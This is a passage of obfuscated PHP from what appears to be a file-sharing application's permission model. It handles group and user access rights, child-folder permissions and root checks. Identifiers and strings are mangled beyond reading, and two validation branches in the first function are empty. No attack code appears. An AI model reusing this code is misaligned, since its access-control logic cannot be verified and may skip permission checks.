!= SourceModel::TYPE_GROUP) { return !1; } $ß‡÷ÕÙ = 1; $­ßÔ¡×î = $åŠÓ¼ã½[$ÍşÊƒÀõ[578]]; if ($­ßÔ¡×î != $ß‡÷ÕÙ) { $‘¼Ì³À = array($ÍşÊƒÀõ[1954] => $­ßÔ¡×î); $«ÇºË„Õ = Model($ÍşÊƒÀõ[2048])->field($ÍşÊƒÀõ[1755])->where($‘¼Ì³À)->select(); $«ÇºË„Õ = array_to_keyvalue($«ÇºË„Õ, $ÍşÊƒÀõ[12], $ÍşÊƒÀõ[1755]); } $·†›ÎÄ— = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ğºÕ®©¡ = array(); foreach ($ñ˜Üêôû as $‰å³å—²) { if (!in_array($‰å³å—²[$ÍşÊƒÀõ[190]], $·†›ÎÄ—)) { show_json(LNG($ÍşÊƒÀõ[2140]), !1); } if ($­ßÔ¡×î != $ß‡÷ÕÙ) { if ($‰å³å—²[$ÍşÊƒÀõ[190]] == SourceModel::TYPE_GROUP) { } if ($‰å³å—²[$ÍşÊƒÀõ[578]] != 0 && !in_array($‰å³å—²[$ÍşÊƒÀõ[578]], $«ÇºË„Õ)) { } } if ($‰å³å—²[$ÍşÊƒÀõ[578]] == 0) { $‰å³å—²[$ÍşÊƒÀõ[190]] = SourceModel::TYPE_USER; } $ğºÕ®©¡[] = array($ÍşÊƒÀõ[193] => $Ñïæ, $ÍşÊƒÀõ[190] => intval($‰å³å—²[$ÍşÊƒÀõ[190]]), $ÍşÊƒÀõ[578] => intval($‰å³å—²[$ÍşÊƒÀõ[578]]), $ÍşÊƒÀõ[2062] => intval($‰å³å—²[$ÍşÊƒÀõ[2062]]) ? intval($‰å³å—²[$ÍşÊƒÀõ[2062]]) : 0, $ÍşÊƒÀõ[2122] => intval($‰å³å—²[$ÍşÊƒÀõ[2122]]) ? intval($‰å³å—²[$ÍşÊƒÀõ[2122]]) : -1); } $this->where(array($ÍşÊƒÀõ[500] => $Ñïæ))->delete(); $this->addAll($ğºÕ®©¡); return !0; } public function authClear($£·º€ÁÆ) { $Ë³€ØÌ® =& $_SERVER[£ğ°ÖØø]; $¥éõ³Û¨ = Model($Ë³€ØÌ®[1401])->sourceInfo($£·º€ÁÆ); $„ÚÆ»Òº = array($£·º€ÁÆ); if ($¥éõ³Û¨[$Ë³€ØÌ®[494]] == $Ë³€ØÌ®[91]) { $çÑÂÙ©’ = array($Ë³€ØÌ®[661] => array($Ë³€ØÌ®[621], $¥éõ³Û¨[$Ë³€ØÌ®[593]] . $£·º€ÁÆ . $Ë³€ØÌ®[622])); $„ÚÆ»Òº = Model($Ë³€ØÌ®[1401])->field($Ë³€ØÌ®[500])->where($çÑÂÙ©’)->getField($Ë³€ØÌ®[193], !0); $„ÚÆ»Òº[] = $£·º€ÁÆ; } $this->where(array($Ë³€ØÌ®[500] => array($Ë³€ØÌ®[501], $„ÚÆ»Òº)))->delete(); return !0; } public function getAllChildren($Æ²şøí×) { $´“€á¦Š =& $_SERVER[£ğ°ÖØø]; $„½¡†üÑ = Model($´“€á¦Š[1401])->sourceInfo($Æ²şøí×); if ($„½¡†üÑ[$´“€á¦Š[494]] != $´“€á¦Š[91]) { return $this->sourceListAuth(array($Æ²şøí×)); } if ($„½¡†üÑ[$´“€á¦Š[190]] != SourceModel::TYPE_GROUP) { return array(); } $Ù™ÏÍ‘‹ = 1; $½ûó…á… = array($Æ²şøí×); if ($„½¡†üÑ[$´“€á¦Š[192]] == $´“€á¦Š[228] && $„½¡†üÑ[$´“€á¦Š[578]] != $Ù™ÏÍ‘‹) { $½ûó…á… = $this->groupChidldAllRootSource($„½¡†üÑ[$´“€á¦Š[578]]); } $Óµû–¾’ = $this->field($´“€á¦Š[193])->group($´“€á¦Š[193])->select(); $Óµû–¾’ = array_to_keyvalue($Óµû–¾’, $´“€á¦Š[12], $´“€á¦Š[193]); if (!$Óµû–¾’) { return array(); } $¸ˆ«Ô±Š = $´“€á¦Š[2141]; $ÅâÙ²†ø = array($´“€á¦Š[193] => array($´“€á¦Š[7], $Óµû–¾’), $´“€á¦Š[514] => $´“€á¦Š[228]); $³Òàû¾Ç = Model($´“€á¦Š[888])->field($¸ˆ«Ô±Š)->where($ÅâÙ²†ø)->select(); $‹£Ü©Şö = array($Æ²şøí×); foreach ($³Òàû¾Ç as $Ùõº• ê) { foreach ($½ûó…á… as $áí•âè) { $ÁŠö»–È = $´“€á¦Š[50] . $áí•âè . $´“€á¦Š[50]; $øØÀ‡„Ş = $Ùõº• ê[$´“€á¦Š[593]] . $Ùõº• ê[$´“€á¦Š[193]] . $´“€á¦Š[50]; if (strstr($øØÀ‡„Ş, $ÁŠö»–È)) { $‹£Ü©Şö[] = $Ùõº• ê[$´“€á¦Š[193]]; break; } } } return $this->sourceListAuth($‹£Ü©Şö); } private function sourceListAuth($¤ÙŒñ‚™) { $Ó®ø¿ûô =& $_SERVER[£ğ°ÖØø]; $ÂÚµÕË = Model($Ó®ø¿ûô[1401])->sourceListInfo($¤ÙŒñ‚™, !0); $Ø ™±Ãµ = $this->sourceAuthSelect($¤ÙŒñ‚™); $›ı±äòƒ = array(); $Ê¢à«ã¡ = array(); foreach ($ÂÚµÕË as $Û†óÑñ’) { unset($Û†óÑñ’[$Ó®ø¿ûô[538]]); unset($Û†óÑñ’[$Ó®ø¿ûô[536]]); unset($Û†óÑñ’[$Ó®ø¿ûô[496]]); unset($Û†óÑñ’[$Ó®ø¿ûô[90]]); $ÜÄ®´® = $Ø ™±Ãµ[$Û†óÑñ’[$Ó®ø¿ûô[193]]]; if (!$ÜÄ®´®) { continue; } $Û†óÑñ’[$Ó®ø¿ûô[2142]] = $this->authTargetInfo($ÜÄ®´®); $Û†óÑñ’[$Ó®ø¿ûô[591]] = rtrim($Û†óÑñ’[$Ó®ø¿ûô[597]], $Ó®ø¿ûô[8]) . $Ó®ø¿ûô[8] . ltrim($Û†óÑñ’[$Ó®ø¿ûô[591]], $Ó®ø¿ûô[8]); $›ı±äòƒ[] = $Û†óÑñ’; $ô¢¥ğ† = count(explode($Ó®ø¿ûô[8], trim($Û†óÑñ’[$Ó®ø¿ûô[591]], $Ó®ø¿ûô[8]))); $Ê¢à«ã¡[] = $ô¢¥ğ† + ($Û†óÑñ’[$Ó®ø¿ûô[33]] == $Ó®ø¿ûô[78] ? 0 : 1000); } array_multisort($Ê¢à«ã¡, SORT_ASC, $›ı±äòƒ); return $›ı±äòƒ; } private function groupChidldAllRootSource($ÛôšÇÁ) { $ûÆ‰Àï… =& $_SERVER[£ğ°ÖØø]; $©£¬üì‘ = Model($ûÆ‰Àï…[2143])->groupChildrenAll($ÛôšÇÁ); $ÀŞËêŠÕ = array($ûÆ‰Àï…[192] => 0, $ûÆ‰Àï…[578] => array($ûÆ‰Àï…[7], $©£¬üì‘), $ûÆ‰Àï…[190] => SourceModel::TYPE_GROUP); $æ™şÓ·È = Model($ûÆ‰Àï…[888])->field($ûÆ‰Àï…[193])->where($ÀŞËêŠÕ)->select(); $æ™şÓ·È = array_to_keyvalue($æ™şÓ·È, $ûÆ‰Àï…[12], $ûÆ‰Àï…[193]); return $æ™şÓ·È; } private function authTargetInfo($ê™¬‰–) { $¸Òæ„ÖÃ =& $_SERVER[£ğ°ÖØø]; $Ëâİá² = array(); $ÌÃÓëÙŒ = array(); $³†ÈŒï = 2 << 25; foreach ($ê™¬‰– as $½’’¤õ”) { $§¤ˆ›Ú¢ = Model($¸Òæ„ÖÃ[580])->listData($½’’¤õ”[$¸Òæ„ÖÃ[2062]]); if (!$§¤ˆ›Ú¢) { continue; } if ($½’’¤õ”[$¸Òæ„ÖÃ[190]] == SourceModel::TYPE_USER) { $£Šµ¦‡Ì = Model($¸Òæ„ÖÃ[586])->getInfoSimpleOuter($½’’¤õ”[$¸Òæ„ÖÃ[578]]); if ($£Šµ¦‡Ì[$¸Òæ„ÖÃ[1755]] == $¸Òæ„ÖÃ[1256]) { continue; } if ($£Šµ¦‡Ì[$¸Òæ„ÖÃ[1755]] == $¸Òæ„ÖÃ[228]) { $£Šµ¦‡Ì[$¸Òæ„ÖÃ[32]] = LNG($¸Òæ„ÖÃ[2144]); } } else { $£Šµ¦‡Ì = Model($¸Òæ„ÖÃ[594])->getInfoSimple($½’’¤õ”[$¸Òæ„ÖÃ[578]]); } if (!$£Šµ¦‡Ì) { continue; } $£Šµ¦‡Ì[$¸Òæ„ÖÃ[549]] = $§¤ˆ›Ú¢; $Ëâİá²[] = $£Šµ¦‡Ì; $±ôÙ©ë² = 0; if ($½’’¤õ”[$¸Òæ„ÖÃ[190]] == SourceModel::TYPE_GROUP) { $±ôÙ©ë² = $³†ÈŒï * 2; } if ($½’’¤õ”[$¸Òæ„ÖÃ[190]] == SourceModel::TYPE_USER) { $±ôÙ©ë² = $³†ÈŒï; } if ($½’’¤õ”[$¸Òæ„ÖÃ[190]] == SourceModel::TYPE_USER && $½’’¤õ”[$¸Òæ„ÖÃ[578]] == $¸Òæ„ÖÃ[228]) { $±ôÙ©ë² = 0; } $ÌÃÓëÙŒ[] = $§¤ˆ›Ú¢[$¸Òæ„ÖÃ[496]] + $±ôÙ©ë²; } array_multisort($ÌÃÓëÙŒ, SORT_DESC, $Ëâİá²); return $Ëâİá²; } public function getAllChildrenByUser($ÜÕ££ÍÏ, $¬ıêÉ‡¢) { $±‹‡˜èÕ =& $_SERVER[£ğ°ÖØø]; $°õ¬ÛÕº = Model($±‹‡˜èÕ[607])->getInfo($¬ıêÉ‡¢); if (!$¬ıêÉ‡¢ || !$ÜÕ££ÍÏ || !$°õ¬ÛÕº) { return array(); } $ÓÛÌ¾¼ï = Model($±‹‡˜èÕ[1401])->sourceInfo($ÜÕ££ÍÏ); $ŸÙÆ‰“ƒ = array(); $Ñ… ‡É = 1; if ($ÓÛÌ¾¼ï[$±‹‡˜èÕ[192]] == $±‹‡˜èÕ[228] && $ÓÛÌ¾¼ï[$±‹‡˜èÕ[578]] != $Ñ… ‡É && $this->groupContainUser($ÓÛÌ¾¼ï[$±‹‡˜èÕ[578]], $¬ıêÉ‡¢)) { foreach ($°õ¬ÛÕº[$±‹‡˜èÕ[2145]] as $§¾â˜ ) { $®²äÈ´ô = Model($±‹‡˜èÕ[594])->getInfo($§¾â˜ [$±‹‡˜èÕ[1954]]); $¥˜ç÷šœ = Model($±‹‡˜èÕ[607])->getInfoSimpleOuter($¬ıêÉ‡¢); $¥˜ç÷šœ[$±‹‡˜èÕ[549]] = $§¾â˜ [$±‹‡˜èÕ[496]]; if (Model($±‹‡˜èÕ[580])->authCheckAction($§¾â˜ [$±‹‡˜èÕ[496]][$±‹‡˜èÕ[496]], $±‹‡˜èÕ[1975])) { continue; } $“Ë€âó = array($±‹‡˜èÕ[32] => $±‹‡˜èÕ[1276] . $®²äÈ´ô[$±‹‡˜èÕ[32]], $±‹‡˜èÕ[193] => $®²äÈ´ô[$±‹‡˜èÕ[90]][$±‹‡˜èÕ[193]], $±‹‡˜èÕ[87] => KodIO::make($®²äÈ´ô[$±‹‡˜èÕ[90]][$±‹‡˜èÕ[193]]), $±‹‡˜èÕ[192] => $±‹‡˜èÕ[228], $±‹‡˜èÕ[190] => $±‹‡˜èÕ[587], $±‹‡˜èÕ[33] => $±‹‡˜èÕ[625], $±‹‡˜èÕ[591] => $®²äÈ´ô[$±‹‡˜èÕ[598]], $±‹‡˜èÕ[1954] => $®²äÈ´ô[$±‹‡˜èÕ[1954]], $±‹‡˜èÕ[595] => $®²äÈ´ô[$±‹‡˜èÕ[192]], $±‹‡˜èÕ[2142] => array($¥˜ç÷šœ)); $ŸÙÆ‰“ƒ[$“Ë€âó[$±‹‡˜èÕ[193]]] = $“Ë€âó; } } $­«€µíê = array(); $©ãÃ‡ôÑ = $this->getAllChildren($ÜÕ££ÍÏ); foreach ($©ãÃ‡ôÑ as $÷…Ñı¥ı) { $ Ù¹Ş = !1; foreach ($÷…Ñı¥ı[$±‹‡˜èÕ[2142]] as $¼óÔ»œ ) { if ($¼óÔ»œ [$±‹‡˜èÕ[1755]]) { if ($¼óÔ»œ [$±‹‡˜èÕ[1755]] == $¬ıêÉ‡¢) { $ Ù¹Ş = !0; break; } } if ($¼óÔ»œ [$±‹‡˜èÕ[1954]]) { if ($this->groupContainUser($¼óÔ»œ [$±‹‡˜èÕ[1954]], $¬ıêÉ‡¢)) { $ Ù¹Ş = !0; break; } } } if ($ Ù¹Ş) { $­«€µíê[] = $÷…Ñı¥ı; } $Õçœ­× = $÷…Ñı¥ı[$±‹‡˜èÕ[193]]; if (isset($ŸÙÆ‰“ƒ[$Õçœ­×])) { $÷…Ñı¥ı[$±‹‡˜èÕ[2142]][] = $ŸÙÆ‰“ƒ[$Õçœ­×][0]; $ŸÙÆ‰“ƒ[$Õçœ­×] = !1; } } $ŸÙÆ‰“ƒ = array_filter(array_values($ŸÙÆ‰“ƒ)); $­«€µíê = array_merge($ŸÙÆ‰“ƒ, $­«€µíê); return $­«€µíê; } public function setAllChildrenByUser($ÂÇáÊĞÆ, $×ÉÛ„ È, $ÈÌ¨ÅÛ¿) { $’¸­Ó‘£ =& $_SERVER[£ğ°ÖØø]; $€õËø‘ = $this->getAllChildrenByUser($ÂÇáÊĞÆ, $×ÉÛ„ È); if (!$ÈÌ¨ÅÛ¿ || !$€õËø‘) { return !1; } foreach ($€õËø‘ as $ìÓçøú¥) { $úöÏÔöï = array(); foreach ($ìÓçøú¥[$’¸­Ó‘£[2142]] as $å²‘Şñ) { $–’ªöªô = $å²‘Şñ[$’¸­Ó‘£[549]]; $ˆ·Ãæ¯© = $å²‘Şñ[$’¸­Ó‘£[1755]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $üù¶íÁ = $å²‘Şñ[$’¸­Ó‘£[1755]] ? $å²‘Şñ[$’¸­Ó‘£[1755]] : $å²‘Şñ[$’¸­Ó‘£[1954]]; if ($å²‘Şñ[$’¸­Ó‘£[1755]] && $å²‘Şñ[$’¸­Ó‘£[1755]] == $×ÉÛ„ È) { continue; } $úöÏÔöï[] = array($’¸­Ó‘£[193] => $ìÓçøú¥[$’¸­Ó‘£[193]], $’¸­Ó‘£[190] => $ˆ·Ãæ¯©, $’¸­Ó‘£[578] => intval($üù¶íÁ), $’¸­Ó‘£[2062] => isset($–’ªöªô[$’¸­Ó‘£[484]]) ? intval($–’ªöªô[$’¸­Ó‘£[484]]) : 0, $’¸­Ó‘£[2122] => isset($–’ªöªô[$’¸­Ó‘£[2122]]) ? intval($–’ªöªô[$’¸­Ó‘£[2122]]) : -1); } $úöÏÔöï[] = array($’¸­Ó‘£[193] => $ìÓçøú¥[$’¸­Ó‘£[193]], $’¸­Ó‘£[190] => SourceModel::TYPE_USER, $’¸­Ó‘£[578] => intval($×ÉÛ„ È), $’¸­Ó‘£[2062] => intval($ÈÌ¨ÅÛ¿), $’¸­Ó‘£[2122] => -1); $this->where(array($’¸­Ó‘£[500] => $ìÓçøú¥[$’¸­Ó‘£[193]]))->delete(); $this->addAll($úöÏÔöï); } return !0; } public function get($¬‘×µ»ç) { $ä²×¥° = $this->getSourceList(array($¬‘×µ»ç), !0); return $ä²×¥°[0]; } public function getSourceList($ÚÇ‡é˜„, $àıÒ›Ü´ = false, $†ªÅÈ£É = false) { $³Í¸í¡Û =& $_SERVER[£ğ°ÖØø]; if (!$ÚÇ‡é˜„) { return array(); } $—­÷”º = Model($³Í¸í¡Û[1401]); if (!$àıÒ›Ü´ && count($ÚÇ‡é˜„) == 1) { $àıÒ›Ü´ = array(); $àıÒ›Ü´[$ÚÇ‡é˜„[0]] = $—­÷”º->sourceInfo($ÚÇ‡é˜„[0]); } if (!$àıÒ›Ü´) { $À¬çéÆª = array($³Í¸í¡Û[500] => array($³Í¸í¡Û[501], $ÚÇ‡é˜„)); $àıÒ›Ü´ = $—­÷”º->field($³Í¸í¡Û[2146])->where($À¬çéÆª)->select(); $àıÒ›Ü´ = array_to_keyvalue($àıÒ›Ü´, $³Í¸í¡Û[193]); } $ø—ÂÈêõ = $ÚÇ‡é˜„; foreach ($àıÒ›Ü´ as $üØ«±Çê => $™¿·Äç§) { $Ğ÷Ïí˜” = $—­÷”º->parentLevelArray($™¿·Äç§[$³Í¸í¡Û[593]]); $ø—ÂÈêõ = array_merge($ø—ÂÈêõ, array($üØ«±Çê), array_reverse($Ğ÷Ïí˜”)); } $ø—ÂÈêõ = array_values(array_unique($ø—ÂÈêõ)); if (!$ø—ÂÈêõ) { return array(); } $êµ¯Å÷ = $this->sourceAuthSelect($ø—ÂÈêõ); $áÑÏÑÓ = array(); foreach ($ø—ÂÈêõ as $‡ğ²“Î‚) { if (isset($êµ¯Å÷[$‡ğ²“Î‚])) { $áÑÏÑÓ[$‡ğ²“Î‚] = $êµ¯Å÷[$‡ğ²“Î‚]; } } $¨ ”“£Ş = $this->userIsRoot($†ªÅÈ£É); $“…¨ìåå = AuthModel::authAll(); $¤İ—”†° = array($³Í¸í¡Û[497] => $“…¨ìåå, $³Í¸í¡Û[2147] => array($³Í¸í¡Û[502] => 0, $³Í¸í¡Û[1960] => $“…¨ìåå, $³Í¸í¡Û[503] => LNG($³Í¸í¡Û[2148]), $³Í¸í¡Û[1977] => $³Í¸í¡Û[2149])); $æÚĞİ¸µ = array(); foreach ($àıÒ›Ü´ as $‡ğ²“Î‚ => $µÎÂ‚ˆ¡) { if ($¨ ”“£Ş && $GLOBALS[$³Í¸í¡Û[6]][$³Í¸í¡Û[1973]]) { $æÚĞİ¸µ[$‡ğ²“Î‚] = $¤İ—”†°; continue; } $æÚĞİ¸µ[$‡ğ²“Î‚] = $this->makeSourceAuth($µÎÂ‚ˆ¡, $áÑÏÑÓ, $†ªÅÈ£É); } return $æÚĞİ¸µ; } public function authDeepCheck($©ä—ˆ¢ó, $ñ•ÔÈÇü = false) { $Š¿ğæèÏ =& $_SERVER[£ğ°ÖØø]; $ñ•ÔÈÇü = $ñ•ÔÈÇü ? $ñ•ÔÈÇü : USER_ID; $¤äõİ = $this->makeAuthDeep($ñ•ÔÈÇü); if (!in_array($©ä—ˆ¢ó, $¤äõİ[$Š¿ğæèÏ[2150]])) { return !1; } $ …‹ûúË = array(); foreach ($¤äõİ[$Š¿ğæèÏ[2151]] as $Â¢œÛÎ³ => $‹²€¾ö) { if (!in_array($©ä—ˆ¢ó, $‹²€¾ö)) { continue; } $ …‹ûúË[] = $Â¢œÛÎ³; } if (!$ …‹ûúË) { return !1; } $¢òŞ¦©ä = $ …‹ûúË ? $ …‹ûúË[0] : $©ä—ˆ¢ó; return array($Š¿ğæèÏ[497] => -1, $Š¿ğæèÏ[549] => array($Š¿ğæèÏ[502] => $Š¿ğæèÏ[1256], $Š¿ğæèÏ[1960] => $Š¿ğæèÏ[228], $Š¿ğæèÏ[503] => LNG($Š¿ğæèÏ[2152]), $Š¿ğæèÏ[1977] => $Š¿ğæèÏ[2153]), $Š¿ğæèÏ[2154] => LNG($Š¿ğæèÏ[2155]), $Š¿ğæèÏ[2156] => $this->sourceAuthInfo($¢òŞ¦©ä)); } protected function makeAuthDeep($¦²±›Ùô = false) { $¥œÇÑÍ¾ =& $_SERVER[£ğ°ÖØø]; static $²ºí– = array(); $¦²±›Ùô = $¦²±›Ùô ? $¦²±›Ùô : USER_ID; if (isset($²ºí–[$¦²±›Ùô])) { return $²ºí–[$¦²±›Ùô]; } $ªİà©­ü = Model($¥œÇÑÍ¾[2157])->listData(); $ê–©è÷ï = array(); foreach ($ªİà©­ü as $¡ÇÆÍ‡ï) { if ($¡ÇÆÍ‡ï[$¥œÇÑÍ¾[496]] == 0 && $¡ÇÆÍ‡ï[$¥œÇÑÍ¾[1976]] == $¥œÇÑÍ¾[91]) { $ê–©è÷ï[] = $¡ÇÆÍ‡ï[$¥œÇÑÍ¾[484]]; } } $ÎŞ¸ıœ = $this->userGroupParents($¦²±›Ùô); $Ä¹„¬å = array($¥œÇÑÍ¾[190] => SourceModel::TYPE_USER, $¥œÇÑÍ¾[578] => $¦²±›Ùô); if ($ÎŞ¸ıœ) { $Ä¹„¬å = array(array($¥œÇÑÍ¾[190] => SourceModel::TYPE_USER, $¥œÇÑÍ¾[578] => $¦²±›Ùô), array($¥œÇÑÍ¾[190] => SourceModel::TYPE_GROUP, $¥œÇÑÍ¾[578] => array($¥œÇÑÍ¾[501], $ÎŞ¸ıœ)), $¥œÇÑÍ¾[1061] => $¥œÇÑÍ¾[2056]); } $ Ñ…—š› = $this->field($¥œÇÑÍ¾[2158])->where($Ä¹„¬å)->select(); $Ôô¯ı²Æ = array(); $‹‹òèÉ„ = array_to_keyvalue_group($ Ñ…—š›, $¥œÇÑÍ¾[193]); foreach ($‹‹òèÉ„ as $ë“¹ıŸ½ => $³”åµŞÉ) { $Ç—ğ¢ŞĞ = $this->authArrayCheck($³”åµŞÉ, $¦²±›Ùô); if ($Ç—ğ¢ŞĞ[$¥œÇÑÍ¾[497]] > 0) { $Ôô¯ı²Æ[] = $ë“¹ıŸ½ . $¥œÇÑÍ¾[12]; } } if ($ÎŞ¸ıœ) { $ÓØ­£›¶ = Model($¥œÇÑÍ¾[594]); foreach ($ÎŞ¸ıœ as $ŠÂÌÅ“Ä) { $ÅöÊÄ¢ø = $ÓØ­£›¶->getInfo($ŠÂÌÅ“Ä); if (!$ÅöÊÄ¢ø || !is_array($ÅöÊÄ¢ø[$¥œÇÑÍ¾[90]])) { continue; } $Ôô¯ı²Æ[] = $ÅöÊÄ¢ø[$¥œÇÑÍ¾[90]][$¥œÇÑÍ¾[193]]; } } $›ô¨íİğ = array(); $ï›ûêğ¢ = $ÎŞ¸ıœ; $ï€áµ¶Ğ = Model($¥œÇÑÍ¾[1401]); $ÓØ­£›¶ = Model($¥œÇÑÍ¾[594]); $©ùÄÔ ï = array(); $–úÒ÷Å = array(); $¡×áìğñ = array(); $àõØ¾ = array(); if ($Ôô¯ı²Æ) { $ÌçÃ‘Î® = $ï€áµ¶Ğ->where(array($¥œÇÑÍ¾[193] => array($¥œÇÑÍ¾[501], $Ôô¯ı²Æ)))->select(); foreach ($ÌçÃ‘Î® as $¯¶ˆõ÷¾) { $û‡¾‘ƒï = $ï€áµ¶Ğ->parentLevelArray($¯¶ˆõ÷¾[$¥œÇÑÍ¾[593]]); $›ô¨íİğ = array_merge($›ô¨íİğ, $û‡¾‘ƒï); $ï›ûêğ¢[] = $¯¶ˆõ÷¾[$¥œÇÑÍ¾[578]]; $©ùÄÔ ï[$¯¶ˆõ÷¾[$¥œÇÑÍ¾[193]]] = $û‡¾‘ƒï; $–úÒ÷Å[$¯¶ˆõ÷¾[$¥œÇÑÍ¾[193]]] = $¯¶ˆõ÷¾[$¥œÇÑÍ¾[578]]; } } $ï›ûêğ¢ = array_values(array_unique($ï›ûêğ¢)); $Á–”Î—¤ = $ï›ûêğ¢; foreach ($Á–”Î—¤ as $ŠÂÌÅ“Ä) { $ÅöÊÄ¢ø = $ÓØ­£›¶->getInfo($ŠÂÌÅ“Ä); $û‡¾‘ƒï = $ï€áµ¶Ğ->parentLevelArray($ÅöÊÄ¢ø[$¥œÇÑÍ¾[593]]); $ï›ûêğ¢ = array_merge($ï›ûêğ¢, $û‡¾‘ƒï); } $ï›ûêğ¢ = array_values(array_unique($ï›ûêğ¢)); foreach ($ï›ûêğ¢ as $ŠÂÌÅ“Ä) { $ÅöÊÄ¢ø = $ÓØ­£›¶->getInfo($ŠÂÌÅ“Ä); $›ô¨íİğ[] = $ÅöÊÄ¢ø[$¥œÇÑÍ¾[90]][$¥œÇÑÍ¾[193]]; $¡×áìğñ[$ŠÂÌÅ“Ä] = $ÅöÊÄ¢ø[$¥œÇÑÍ¾[90]][$¥œÇÑÍ¾[193]]; $àõØ¾[$ŠÂÌÅ“Ä] = $ï€áµ¶Ğ->parentLevelArray($ÅöÊÄ¢ø[$¥œÇÑÍ¾[593]]); } foreach ($©ùÄÔ ï as $¼¬ïíæã => $ûĞ‘Ôüà) { $¶÷Ì´â‘ = $–úÒ÷Å[$¼¬ïíæã]; if (!$¶÷Ì´â‘ || !$¡×áìğñ[$¶÷Ì´â‘]) { continue; } $¸¼Ö”ó = array(); foreach ($àõØ¾[$¶÷Ì´â‘] as $ŠÂÌÅ“Ä) { $¸¼Ö”ó[] = $¡×áìğñ[$ŠÂÌÅ“Ä]; } $©ùÄÔ ï[$¼¬ïíæã] = array_merge($¸¼Ö”ó, $ûĞ‘Ôüà); } $›ô¨íİğ = array_values(array_unique($›ô¨íİğ)); $¤ÄØ¦¿ï = array($¥œÇÑÍ¾[2150] => $›ô¨íİğ, $¥œÇÑÍ¾[2151] => $©ùÄÔ ï); $²ºí–[$¦²±›Ùô] = $¤ÄØ¦¿ï; return $¤ÄØ¦¿ï; } private function makeSourceAuth($ŠŠóá¦Ù, $÷†ÏÅ‚Í, $’˜“÷ñ = false) { $İ¾²‚§ =& $_SERVER[£ğ°ÖØø]; $‰ßÆ¡º™ = $İ¾²‚§[91]; $ßğ£¦ö = $ŠŠóá¦Ù[$İ¾²‚§[578]]; $âç¬ìå¥ = $ŠŠóá¦Ù[$İ¾²‚§[190]] == SourceModel::TYPE_GROUP; $šø¶Œû“ = $âç¬ìå¥ ? $this->groupRootAuth($ßğ£¦ö, $’˜“÷ñ) : !1; if ($šø¶Œû“ && Model($İ¾²‚§[580])->authCheckAction($šø¶Œû“[$İ¾²‚§[496]], $İ¾²‚§[1975])) { return $this->groupAuthInfo($šø¶Œû“, $ßğ£¦ö); } $È€Ã—Î© = Model($İ¾²‚§[1401])->parentLevelArray($ŠŠóá¦Ù[$İ¾²‚§[593]]); $È€Ã—Î© = array_merge(array($ŠŠóá¦Ù[$İ¾²‚§[193]]), array_reverse($È€Ã—Î©)); $á¨Ì»Ğî = !1; foreach ($È€Ã—Î© as $¿¿ÜÁ½Á) { if (!isset($÷†ÏÅ‚Í[$¿¿ÜÁ½Á])) { continue; } $½½™ü¯¥ = $this->authMake($÷†ÏÅ‚Í[$¿¿ÜÁ½Á], $’˜“÷ñ); if ($½½™ü¯¥[$İ¾²‚§[549]]) { $á¨Ì»Ğî = $½½™ü¯¥; break; } } if (!$âç¬ìå¥) { return $á¨Ì»Ğî; } if (!$á¨Ì»Ğî && $šø¶Œû“) { $á¨Ì»Ğî = $this->groupAuthInfo($šø¶Œû“, $ßğ£¦ö); } if (!$á¨Ì»Ğî) { $óÛÁ““º = Model($İ¾²‚§[594])->getInfo($ßğ£¦ö); $Šº¥é–Ñ = explode($İ¾²‚§[50], trim($óÛÁ““º[$İ¾²‚§[593]], $İ¾²‚§[50])); $Šº¥é–Ñ = array_reverse($Šº¥é–Ñ); foreach ($Šº¥é–Ñ as $×ğˆ™½¶) { if ($×ğˆ™½¶ == $İ¾²‚§[228] || $×ğˆ™½¶ == $‰ßÆ¡º™) { continue; } $“³İÈ¨ = $this->groupRootAuth($×ğˆ™½¶, $’˜“÷ñ); if (!$“³İÈ¨) { continue; } $á¨Ì»Ğî = $this->groupAuthInfo($“³İÈ¨, $×ğˆ™½¶); break; } } if (!$á¨Ì»Ğî || $á¨Ì»Ğî[$İ¾²‚§[497]] <= 0) { $öë­Óˆ = $this->authDeepCheck($ŠŠóá¦Ù[$İ¾²‚§[193]], $’˜“÷ñ); if ($öë­Óˆ) { $á¨Ì»Ğî = $öë­Óˆ; } } return $á¨Ì»Ğî; } private function userIsRoot($÷ãêÒÅ = false) { $êôîšå³ =& $_SERVER[£ğ°ÖØø]; if (!$÷ãêÒÅ && KodUser::isRoot()) { return !0; } $İìÅ©©² = Model($êôîšå³[607])->getInfo($÷ãêÒÅ); $§Â¾×À = Model($êôîšå³[2159])->listData($İìÅ©©²[$êôîšå³[2160]]); if ($§Â¾×À && $§Â¾×À[$êôîšå³[584]][$êôîšå³[2161]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‡ÄË÷Ú„) { $¨¿³šô” =& $_SERVER[£ğ°ÖØø]; $Ï•øÚø¼ = Model($¨¿³šô”[1401]); $ÌËê¹ = $Ï•øÚø¼->sourceInfo($‡ÄË÷Ú„); if (!$ÌËê¹) { return !1; } $Ï•øÚø¼->groupPathDisplay($ÌËê¹); $œ©şş’Û = array($ÌËê¹); $œ©şş’Û = $Ï•øÚø¼->_listAppendPath($œ©şş’Û); $ÌËê¹ = $œ©şş’Û[0]; $§®ş¦· = $ÌËê¹[$¨¿³šô”[591]]; if (isset($ÌËê¹[$¨¿³šô”[599]])) { $ÊÁŸíïÕ = explode($¨¿³šô”[8], trim($ÌËê¹[$¨¿³šô”[591]], $¨¿³šô”[8])); array_shift($ÊÁŸíïÕ); $§®ş¦· = $ÌËê¹[$¨¿³šô”[597]] . $¨¿³šô”[2162] . implode($¨¿³šô”[8], $ÊÁŸíïÕ); } return array($¨¿³šô”[503] => $ÌËê¹[$¨¿³šô”[32]], $¨¿³šô”[87] => KodIO::make($ÌËê¹[$¨¿³šô”[193]]), $¨¿³šô”[2163] => $§®ş¦·); } private function groupAuthInfo($ÌèÈ¬šÀ, $¼×­ Òİ) { $·ãìÑüî =& $_SERVER[£ğ°ÖØø]; $„²ó¼« = Model($·ãìÑüî[594])->getInfo($¼×­ Òİ); return array($·ãìÑüî[2164] => intval($ÌèÈ¬šÀ[$·ãìÑüî[496]]), $·ãìÑüî[2147] => $ÌèÈ¬šÀ, $·ãìÑüî[2165] => LNG($·ãìÑüî[2166]), $·ãìÑüî[2156] => array($·ãìÑüî[503] => $„²ó¼«[$·ãìÑüî[32]], $·ãìÑüî[87] => KodIO::make($„²ó¼«[$·ãìÑüî[90]][$·ãìÑüî[193]]), $·ãìÑüî[2163] => $„²ó¼«[$·ãìÑüî[598]])); } protected function groupRootAuth($òÛüúº°, $äÃÇŞ‚ö = false) { $·ìÇĞïš =& 